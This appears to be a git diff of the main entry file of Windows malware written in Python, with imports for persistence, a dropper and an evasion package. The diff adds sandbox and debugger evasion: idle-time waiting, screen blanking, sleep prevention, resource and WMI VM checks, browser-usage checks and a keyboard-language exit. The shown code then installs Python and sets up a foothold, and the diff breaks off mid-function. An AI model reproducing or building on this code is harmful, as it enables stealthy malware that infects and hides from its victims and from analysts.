@@ -1,29 +1,47 @@
 import sys
-
+from time import sleep
 from Persistance.foothold import get_pyinstaller,install_python,create_dropper
 from Utils.helpers import is_python_exist,is_online,find_python_path,is_admin
 from sys import exit as sys_exit
 from os.path import join as path_join
-from Evasion import specCheck,hide
+from Evasion import debugEvasion,vmDetect
+from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep,turn_screen_off,get_keyboard_language
 
+#//TODO: instead of sys.exit. spawn subprocess to delete the whole thing before.
 def main():
-    if any([not specCheck.is_enough_ram(),not specCheck.is_enough_disk(), not specCheck.is_enough_cores()]):
-        sys_exit(0) #Stop exec if we suspect that's vm/sandbox by resource check
+    debug = True #if true -- vm evasion will result only in printing!
+    vm_flag = sys.exit if not debug else lambda x: print(x)
+    prevent_sleep()
+    if not debug :
+        while get_idle_duration() < 180:
+            sleep(180)
+    if not debug:
+        turn_screen_off()
+    """
+    if we are here, get_idle_duration is higher than 180. so user didn't touched anything for 180 seconds atleast
+    we run prevent sleep to prevent the pc from actually sleeping
+    we make the screen black
+    and we start!
+    """
+    if any([not vmDetect.is_enough_ram(),not vmDetect.is_enough_disk(), not vmDetect.is_enough_cores()]):
+        vm_flag("EXITED ON ANY_SPEC CHECK") #Stop exec if we suspect that's vm/sandbox by resource check
     #//TODO: add doc
     if not is_online():
-        sys_exit('NOT ONLINE') #another vm evade check
-    if specCheck.find_debug_process():
-        sys.exit(0) # stop exec if we have debug process somewhere
-    if hide.detect_vm():
-        sys.exit(0) #another vm evade
+        vm_flag('NOT ONLINE') #another vm evade check
+    if debugEvasion.find_debug_process():
+        vm_flag("we found debug process") # stop exec if we have debug process somewhere
+    if not is_normal_browser_user():
+        vm_flag("not a normal browser user")
+    if vmDetect.detect_vm_by_wmi():
+        vm_flag("detected vm by wmi") #another vm evade
         #we do the detect_vm as last check as this is noisy AF
-
-
-
+    if get_keyboard_language() in ["0x819","0x043b"]:
+        vm_flag("WE ARE NOT GONNA RUN IN RUSSIA")
+    print(get_keyboard_language())
     if not is_python_exist():
         install_python()
 
-    pythonPath = path_join(find_python_path(),'python.exe')
+    pythonPath = find_python_path()
     if not is_admin():
         get_pyinstaller(pythonPath,admin=False)
     else:
